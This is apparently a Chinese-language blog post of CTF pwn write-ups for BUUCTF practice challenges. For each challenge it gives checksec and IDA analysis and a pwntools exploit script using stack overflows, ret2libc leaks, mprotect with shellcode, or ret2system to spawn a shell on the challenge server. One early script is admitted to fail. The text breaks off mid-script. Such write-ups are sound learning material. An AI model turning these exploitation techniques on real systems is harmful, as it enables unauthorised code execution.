<h2 id="not-the-same-3dsctf-2016-1"><a href="#not-the-same-3dsctf-2016-1" class="headerlink" title="not_the_same_3dsctf_2016 1"></a>not_the_same_3dsctf_2016 1</h2><h2 id="checksec和查看运行流程-2"><a href="#checksec和查看运行流程-2" class="headerlink" title="checksec和查看运行流程"></a>checksec和查看运行流程</h2><p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/main/BUU%E5%88%B7%E9%A2%98-1/image-20210730104635957.png?raw=true" alt="image-20210730104635957.png"></p>
<p>32位的程序，只看了NX</p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/main/BUU%E5%88%B7%E9%A2%98-1/image-20210730104703310.png?raw=true" alt="image-20210730104703310.png"></p>
<p>一串奇怪的提示之后，进行一次输入就结束了。</p>
<h2 id="利用IDA查看分析"><a href="#利用IDA查看分析" class="headerlink" title="利用IDA查看分析"></a>利用IDA查看分析</h2><p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/main/BUU%E5%88%B7%E9%A2%98-1/image-20210730105147713.png?raw=true" alt="image-20210730105147713.png"></p>
<p>存在一个明显的栈溢出漏洞</p>
<h2 id="构思-3"><a href="#构思-3" class="headerlink" title="构思"></a>构思</h2><p>我这一题选择了自己写，那我看到了这个栈溢出的话我选择的是泄露地址之后构造shell。</p>
<p>1.查看程序中有什么函数可以利用：<br><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/main/BUU%E5%88%B7%E9%A2%98-1/image-20210730105315593.png?raw=true" alt="image-20210730105315593.png"></p>
<p>我们可以看到这里存在一个write，可以泄露地址。</p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/main/BUU%E5%88%B7%E9%A2%98-1/image-20210730105344517.png?raw=true" alt="image-20210730105344517.png"></p>
<p>并且这里存在一个read函数可以写入shell。</p>
<p>2.不仅如此我们既然已经知道了泄露的地址，那不可以直接查找system和bin/sh的地址来直接调用呢？</p>
<h2 id="尝试EXP"><a href="#尝试EXP" class="headerlink" title="尝试EXP"></a>尝试EXP</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">p &#x3D; remote(&#39;node4.buuoj.cn&#39;,26024)</span><br><span class="line">elf &#x3D; ELF(&#39;.&#x2F;not_the_same_3dsctf_2016&#39;)</span><br><span class="line">pop_edi &#x3D; 0x08063b9b</span><br><span class="line">write_addr &#x3D; 0x0806e270</span><br><span class="line">read_addr &#x3D; 0x0806e200</span><br><span class="line">main_addr &#x3D; 0x80489e0</span><br><span class="line">puts_got &#x3D; elf.got[&#39;puts&#39;]</span><br><span class="line">puts_plt &#x3D; elf.plt[&#39;puts&#39;]</span><br><span class="line">write_got &#x3D; elf.got[&#39;write&#39;]</span><br><span class="line">write_plt &#x3D; elf.plt[&#39;write&#39;]</span><br><span class="line">read_got &#x3D; elf.got[&#39;read&#39;]</span><br><span class="line">read_plt &#x3D; elf.plt[&#39;read&#39;]</span><br><span class="line">p.recvuntil(&#39;b0r4 v3r s3 7u 4h o b1ch4o m3m0...&#39;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;a&#39;*0x2D + p32(write_plt) + p32(pop_edi) + p32(0) + p32(write_got) + p32(4) + p32(main_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">write_got_addr &#x3D; u32(p.recv(4))</span><br><span class="line">print hex(write_got_addr)</span><br><span class="line"></span><br><span class="line">libc &#x3D; LibcSearcher(&#39;write&#39;,write_got_addr)</span><br><span class="line">libc_base &#x3D; write_got - write_got_addr</span><br><span class="line">system_addr &#x3D; libc_base + libc.dump(&#39;system&#39;)</span><br><span class="line">bin_sh_addr &#x3D; libc_base + libc.dump(&#39;str_bin_sh&#39;)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#39;b0r4 v3r s3 7u 4h o b1ch4o m3m0...&#39;)</span><br><span class="line">payload &#x3D; &#39;a&#39;*0x2D + p32(system_addr) + p32(0) + p32(bin_sh_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>xswl，根本不行。</p>
<h3 id="分析总结"><a href="#分析总结" class="headerlink" title="分析总结"></a>分析总结</h3><p>1.这里我们重新分析一下什么是NX保护</p>
<p>NX：表示不可执行，具体在两份方面，一方面是不可修改got表来shellcode；另一方面是堆栈段不可执行。</p>
<p>这也就是我们不能成功的原因，对于第一种想法我们发现了在NX保护中堆栈段是不可执行的那么read写入的内容就失效了。</p>
<p>对于第二种想法，我们在程序中甚至连system都找不到…..</p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/main/BUU%E5%88%B7%E9%A2%98-1/image-20210730105954398.png?raw=true" alt="image-20210730105954398.png"></p>
<p>八竿子都不找的亲戚</p>
<h2 id="正确的解题思路"><a href="#正确的解题思路" class="headerlink" title="正确的解题思路"></a>正确的解题思路</h2><h3 id="1-使用mprotect函数修改权限破解堆栈段不可写"><a href="#1-使用mprotect函数修改权限破解堆栈段不可写" class="headerlink" title="1.使用mprotect函数修改权限破解堆栈段不可写"></a>1.使用mprotect函数修改权限破解堆栈段不可写</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p &#x3D; remote(&#39;node4.buuoj.cn&#39;,26024)</span><br><span class="line">elf&#x3D;ELF(&quot;.&#x2F;not_the_same_3dsctf_2016&quot;)	</span><br><span class="line">pop_edi &#x3D; 0x0806fcc8</span><br><span class="line">mprotect &#x3D; 0x0806ed40</span><br><span class="line">read_addr &#x3D; 0x0806e200</span><br><span class="line">bss &#x3D; 0x80eb000</span><br><span class="line">get_secret &#x3D; 0x080489A0</span><br><span class="line">flag &#x3D; 0x080ECA2D</span><br><span class="line">write_addr &#x3D; elf.sym[&#39;write&#39;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;a&#39;*0x2d + p32(mprotect) + p32(pop_edi) + p32(bss) + p32(0x100) + p32(0x7) + p32(read_addr) </span><br><span class="line">payload +&#x3D; p32(read_addr) + p32(pop_edi) + p32(0) + p32(bss) + p32(0x100) +  p32(bss)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">payload&#x3D;asm(shellcraft.sh())</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="2-我们可以发现其实有特殊函数"><a href="#2-我们可以发现其实有特殊函数" class="headerlink" title="2.我们可以发现其实有特殊函数"></a>2.我们可以发现其实有特殊函数</h3><p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/main/BUU%E5%88%B7%E9%A2%98-1/image-20210730110220687.png?raw=true" alt="image-20210730110220687.png"></p>
<p>这里存在一个函数将flag的内容写入f14g中，并且f14g存在的是bss段中，可以读。</p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/main/BUU%E5%88%B7%E9%A2%98-1/image-20210730110304707.png?raw=true" alt="image-20210730110304707.png"></p>
<p>那么我们就可以利用它的特点了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p &#x3D; remote(&#39;node4.buuoj.cn&#39;,26024)</span><br><span class="line">elf&#x3D;ELF(&quot;.&#x2F;not_the_same_3dsctf_2016&quot;)	</span><br><span class="line">pop_edi &#x3D; 0x0806fcc8</span><br><span class="line">mprotect &#x3D; 0x0806ed40</span><br><span class="line">read_addr &#x3D; 0x0806e200</span><br><span class="line">bss &#x3D; 0x80eb000</span><br><span class="line">get_secret &#x3D; 0x080489A0</span><br><span class="line">flag &#x3D; 0x080ECA2D</span><br><span class="line">write_addr &#x3D; elf.sym[&#39;write&#39;]</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;a&#39;*0x2d + p32(get_secret) + p32(write_addr) + p32(0) + p32(0) + p32(flag) + p32(0x100)</span><br><span class="line">shellcode&#x3D;asm(shellcraft.sh())</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h2><p>1.开启NX保护的程序，如果存在mprotect的话，可以使用mprotect修改权限。</p>
<p>2.关于后门函数的话，我们需要细心查找，并且知道一些可能的名字</p>
<h1 id="HarekazeCTF2019-baby-rop-1"><a href="#HarekazeCTF2019-baby-rop-1" class="headerlink" title="[HarekazeCTF2019]baby_rop 1"></a>[HarekazeCTF2019]baby_rop 1</h1><h2 id="checksec和查看运行流程-3"><a href="#checksec和查看运行流程-3" class="headerlink" title="checksec和查看运行流程"></a>checksec和查看运行流程</h2><p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/main/BUU%E5%88%B7%E9%A2%98-1/image-20210730110844486.png?raw=true" alt="image-20210730110844486.png"></p>
<p>为32位程序，只开了NX保护</p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/main/BUU%E5%88%B7%E9%A2%98-1/image-20210730111010967.png?raw=true" alt="image-20210730111010967.png"></p>
<p>这里我们发现程序进行了一次输入，并且会打印一遍输入的内容。</p>
<h2 id="利用IDA分析-4"><a href="#利用IDA分析-4" class="headerlink" title="利用IDA分析"></a>利用IDA分析</h2><p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/main/BUU%E5%88%B7%E9%A2%98-1/image-20210730111133685.png?raw=true" alt="image-20210730111133685.png"></p>
<p>我们发现程序存在一个栈溢出漏洞</p>
<h2 id="构思-4"><a href="#构思-4" class="headerlink" title="构思"></a>构思</h2><p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/main/BUU%E5%88%B7%E9%A2%98-1/image-20210730111230178.png?raw=true" alt="image-20210730111230178.png"></p>
<p>我们查看程序的内容的时候发现，程序中存在system和bin/sh,那么我们是可以直接利用栈溢出来构造shell的，但我们要明白64位的程序中是需要利用寄存器传递参数的。</p>
<h2 id="EXP-5"><a href="#EXP-5" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p &#x3D; remote(&#39;node4.buuoj.cn&#39;,25772)</span><br><span class="line">#p &#x3D; process(&#39;.&#x2F;babyrop_2&#39;)</span><br><span class="line">elf &#x3D; ELF(&#39;.&#x2F;babyrop_2&#39;)</span><br><span class="line">pop_rdi &#x3D; 0x0000000000400683</span><br><span class="line">pop_ret &#x3D; 0x000000000040067A</span><br><span class="line">call_addr &#x3D; 0x0000000000400660</span><br><span class="line">system_addr &#x3D; 0x0000000000400490</span><br><span class="line">bin_sh_addr &#x3D;  0x0601048</span><br><span class="line">main_addr &#x3D; 0x4005d6</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">p.recvuntil(&#39;? &#39;)</span><br><span class="line">payload &#x3D; &#39;a&#39;*0x18 + p64(pop_rdi) + p64(bin_sh_addr) + p64(system_addr) + p64(main_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>但我们发现这个交互非常奇怪我们ls之后并没有发现flag：</p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/main/BUU%E5%88%B7%E9%A2%98-1/image-20210730112101004.png?raw=true" alt="image-20210730112101004.png"></p>
<h3 id="小技巧-2"><a href="#小技巧-2" class="headerlink" title="小技巧"></a>小技巧</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">我们可以利用语句：</span><br><span class="line">find -name flag</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/main/BUU%E5%88%B7%E9%A2%98-1/image-20210730112353342.png?raw=true" alt="image-20210730112353342.png"></p>
<p>而且这里好像还限制了时间和输入次数，这样的话就需要我们多次链接确定信息。并且可以利用EXP直接传递可以避免超时。</p>
<h1 id="jarvisoj-level2-x64"><a href="#jarvisoj-level2-x64" class="headerlink" title="jarvisoj_level2_x64"></a>jarvisoj_level2_x64</h1><h2 id="checksec和查看运行流程-4"><a href="#checksec和查看运行流程-4" class="headerlink" title="checksec和查看运行流程"></a>checksec和查看运行流程</h2><p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/main/BUU%E5%88%B7%E9%A2%98-1/image-20210813091438538.png?raw=true" alt="image-20210813091438538.png"></p>
<p>64位程序且只看了NX保护</p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/main/BUU%E5%88%B7%E9%A2%98-1/image-20210813091456850.png?raw=true" alt="image-20210813091456850.png"></p>
<p>进行一次输入后结束</p>
<h2 id="利用IDA分析-5"><a href="#利用IDA分析-5" class="headerlink" title="利用IDA分析"></a>利用IDA分析</h2><p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/main/BUU%E5%88%B7%E9%A2%98-1/image-20210813091632007.png?raw=true" alt="image-20210813091632007.png"></p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/main/BUU%E5%88%B7%E9%A2%98-1/image-20210813091725152.png?raw=true" alt="image-20210813091725152.png"></p>
<p>存在栈溢出漏洞之后我们看看是不是存在system和bin_sh</p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/main/BUU%E5%88%B7%E9%A2%98-1/image-20210813091902210.png?raw=true" alt="image-20210813091902210.png"></p>
<img src="/2021/08/12/BUU%E5%88%B7%E9%A2%98-1/08/12/BUU%E5%88%B7%E9%A2%98-1/image-20210813091826172.png" class title="image-20210813091826172">

<p>都存在那么我们就可以直接跳转</p>
<h2 id="构思-5"><a href="#构思-5" class="headerlink" title="构思"></a>构思</h2><p>利用栈溢出漏洞跳转到system上执行/bin/sh来get_shell</p>
<h2 id="EXP-6"><a href="#EXP-6" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p &#x3D; remote(&#39;node4.buuoj.cn&#39;,26057)</span><br><span class="line">elf &#x3D; ELF(&#39;.&#x2F;level2_x64&#39;)</span><br><span class="line"></span><br><span class="line">bss &#x3D; 0x555555779000</span><br><span class="line">read_addr &#x3D; 0x04004D0</span><br><span class="line">main_addr &#x3D;0x400620</span><br><span class="line">bin_sh_addr &#x3D; 0x0600A90</span><br><span class="line">pop_rdi &#x3D; 0x00000000004006b3</span><br><span class="line">system_addr &#x3D; elf.sym[&#39;system&#39;]</span><br><span class="line">payload &#x3D; &#39;a&#39;*0x80 + p64(0) + p64(pop_rdi) + p64(bin_sh_addr) +p64(system_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="ciscn-2019-n-5"><a href="#ciscn-2019-n-5" class="headerlink" title="ciscn_2019_n_5"></a>ciscn_2019_n_5</h1><h2 id="checksec和查看运行流程-5"><a href="#checksec和查看运行流程-5" class="headerlink" title="checksec和查看运行流程"></a>checksec和查看运行流程</h2><p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/main/BUU%E5%88%B7%E9%A2%98-1/image-20210813092058762.png?raw=true" alt="image-20210813092058762.png"></p>
<p>64位程序保护全没开</p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/main/BUU%E5%88%B7%E9%A2%98-1/image-20210813092133957.png?raw=true" alt="image-20210813092133957.png"></p>
<p>程序会进行两次输入</p>
<h2 id="利用IDA分析-6"><a href="#利用IDA分析-6" class="headerlink" title="利用IDA分析"></a>利用IDA分析</h2><p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/main/BUU%E5%88%B7%E9%A2%98-1/image-20210813092921276.png?raw=true" alt="image-20210813092921276.png"></p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/main/BUU%E5%88%B7%E9%A2%98-1/image-20210813092935936.png?raw=true" alt="image-20210813092935936.png"></p>
<p>第一次输入的内容可以直接写在在bss段上</p>
<p>第二次我们的输入由gets控制，存在栈溢出漏洞</p>
<h2 id="构思-6"><a href="#构思-6" class="headerlink" title="构思"></a>构思</h2><p>因为保护全没开，可以在第一次输入时写入shellcode，第二次输入时利用栈溢出漏洞跳转到bss段上执行shellcode来get_shell</p>
<h2 id="EXP-7"><a href="#EXP-7" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p &#x3D; remote(&#39;node4.buuoj.cn&#39;,29339)</span><br><span class="line">#p &#x3D; process(&#39;.&#x2F;ciscn_2019_n_5&#39;)</span><br><span class="line">#elf &#x3D; ELF(&#39;.&#x2F;ciscn_2019_n_5&#39;)</span><br><span class="line">bss &#x3D; 0x601080</span><br><span class="line">#system_addr &#x3D; elf.sym[&#39;system&#39;]</span><br><span class="line">context.arch&#x3D;&quot;amd64&quot;</span><br><span class="line">payload&#x3D;asm(shellcraft.sh())</span><br><span class="line">p.sendlineafter(&#39;tell me your name&#39;,payload)</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;a&#39;*0x28 + p64(bss) </span><br><span class="line">p.sendlineafter(&#39;What do you want to say to me?&#39;,payload)</span><br><span class="line"></span><br><span class="line">p.sendline(&#39;cat flag&#39;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="others-shellcode"><a href="#others-shellcode" class="headerlink" title="others_shellcode"></a>others_shellcode</h2><p>直接连上就可以get_shell</p>
<h2 id="ciscn-2019-ne-5"><a href="#ciscn-2019-ne-5" class="headerlink" title="ciscn_2019_ne_5"></a>ciscn_2019_ne_5</h2><h2 id="checksec和查看运行流程-6"><a href="#checksec和查看运行流程-6" class="headerlink" title="checksec和查看运行流程"></a>checksec和查看运行流程</h2><p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/main/BUU%E5%88%B7%E9%A2%98-1/image-20210813093239709.png?raw=true" alt="image-20210813093239709.png"></p>
<p>32位的程序，只开了NX保护</p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/main/BUU%E5%88%B7%E9%A2%98-1/image-20210813093328143.png?raw=true" alt="image-20210813093328143.png"></p>
<p>进行一次输入，但报错不太了解具体情况，利用IDA分析</p>
<h2 id="利用IDA分析-7"><a href="#利用IDA分析-7" class="headerlink" title="利用IDA分析"></a>利用IDA分析</h2><p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/main/BUU%E5%88%B7%E9%A2%98-1/image-20210813093737358.png?raw=true" alt="image-20210813093737358.png"></p>
<p>利用IDA分析后发现第一次输入的密码是administrator，我们再一次运行</p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/main/BUU%E5%88%B7%E9%A2%98-1/image-20210813093834387.png?raw=true" alt="image-20210813093834387.png"></p>
<p>输入正确的密码后就会显示4项功能选项</p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/main/BUU%E5%88%B7%E9%A2%98-1/image-20210813094315293.png?raw=true" alt="image-20210813094315293.png"></p>
<p>我们发现这里存在一个没有显示的功能4</p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/main/BUU%E5%88%B7%E9%A2%98-1/image-20210813094343279.png?raw=true" alt="image-20210813094343279.png"></p>
<p>并且这里存在copy函数，dest距离栈底的距离为0x48，如果我们的src大于0x48的话就存在栈溢出漏洞，那么我们追根溯源一下src</p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/main/BUU%E5%88%B7%E9%A2%98-1/image-20210813094454929.png?raw=true" alt="image-20210813094454929.png"></p>
<p>我们在功能一（add）中发现这里的输入是src的起源，并且它的大小为0x80大于0x48存在栈溢出漏洞，那么我们看看程序中有什么可以利用的内容</p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/main/BUU%E5%88%B7%E9%A2%98-1/image-20210813094613647.png?raw=true" alt="image-20210813094613647.png"></p>
<h2 id="构思-7"><a href="#构思-7" class="headerlink" title="构思"></a>构思</h2><p>先绕过检测–&gt;进入功能选项–&gt;使用功能一进行布局–&gt;利用功能四使得布局运行–&gt;get_shell</p>
<h2 id="EXP-8"><a href="#EXP-8" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(log_level&#x3D;&#39;debug&#39;)</span><br><span class="line">elf &#x3D; ELF(&#39;.&#x2F;ciscn_2019_ne_5&#39;)</span><br><span class="line"></span><br><span class="line">p &#x3D; remote(&#39;node4.buuoj.cn&#39;,25712)</span><br><span class="line"></span><br><span class="line">system_addr &#x3D; elf.sym[&#39;system&#39;]</span><br><span class="line">sh_str &#x3D; 0x080482ea</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&#39;password:&#39;, &#39;administrator&#39;)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(&#39;1&#39;)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#39;info:&#39;)</span><br><span class="line">payload &#x3D; &#39;a&#39; * (0x48 + 4) + p32(system_addr) + p32(sh_str) + p32(sh_str)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(&#39;4&#39;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="铁人三项-第五赛区-2018-rop"><a href="#铁人三项-第五赛区-2018-rop" class="headerlink" title="铁人三项(第五赛区)_2018_rop"></a>铁人三项(第五赛区)_2018_rop</h1><h2 id="checksec和查看运行流程-7"><a href="#checksec和查看运行流程-7" class="headerlink" title="checksec和查看运行流程"></a>checksec和查看运行流程</h2><p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/main/BUU%E5%88%B7%E9%A2%98-1/image-20210813094759539.png?raw=true" alt="image-20210813094759539.png"></p>
<p>32位程序，只开了NX</p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/main/BUU%E5%88%B7%E9%A2%98-1/image-20210813094830300.png?raw=true" alt="image-20210813094830300.png"></p>
<p>进行一次输入之后退出</p>
<h2 id="利用IDA分析-8"><a href="#利用IDA分析-8" class="headerlink" title="利用IDA分析"></a>利用IDA分析</h2><p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/main/BUU%E5%88%B7%E9%A2%98-1/image-20210813095038362.png?raw=true" alt="image-20210813095038362.png"></p>
<p>存在栈溢出漏洞，但是搜索完没有发现system，那么就需要我们进行泄露got表来获取libc了</p>
<h2 id="构思-8"><a href="#构思-8" class="headerlink" title="构思"></a>构思</h2><p>第一次输入利用栈溢出来泄露地址并返回Main_addr</p>
<p>第二次输入构造system来get_shell</p>
<h2 id="EXP-9"><a href="#EXP-9" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">p &#x3D; remote(&#39;node4.buuoj.cn&#39;,26760)</span><br><span class="line"></span><br><span class="line">elf &#x3D; ELF(&#39;.&#x2F;2018_rop&#39;)</span><br><span class="line">write_got &#x3D; elf.got[&#39;write&#39;]</span><br><span class="line">write_plt &#x3D; elf.plt[&#39;write&#39;]</span><br><span class="line">main_addr &#x3D; elf.sym[&#39;main&#39;]</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;a&#39;*(0x88+4) + p32(write_plt) + p32(main_addr) + p32(0) + p32(write_got) +p32(4)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">write_got_addr &#x3D; u32(p.recv(4))</span><br><span class="line"></span><br><span class="line">libc &#x3D; LibcSearcher(&#39;write&#39;,write_got_addr)</span><br><span class="line">libc_base &#x3D; write_got_addr - libc.dump(&#39;write&#39;)	</span><br><span class="line">system_addr &#x3D; libc_base + libc.dump(&#39;system&#39;)</span><br><span class="line">bin_sh_addr &#x3D; libc_base + libc.dump(&#39;str_bin_sh&#39;)</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;a&#39;*(0x88+4) + p32(system_addr) + p32(main_addr) + p32(bin_sh_addr) </span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="bjdctf-2020-babyrop"><a href="#bjdctf-2020-babyrop" class="headerlink" title="bjdctf_2020_babyrop"></a>bjdctf_2020_babyrop</h2><p>本题也是与铁人三项(第五赛区)_2018_rop类似的题目，区别在于本题是64位，所以需要利用语句</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary 文件名 --only &#39;pop|ret&#39;</span><br></pre></td></tr></table></figure>

<p>语句来找到pop_rdi_ret等‘积木’来完成布局</p>
<h2 id="EXP-10"><a href="#EXP-10" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span 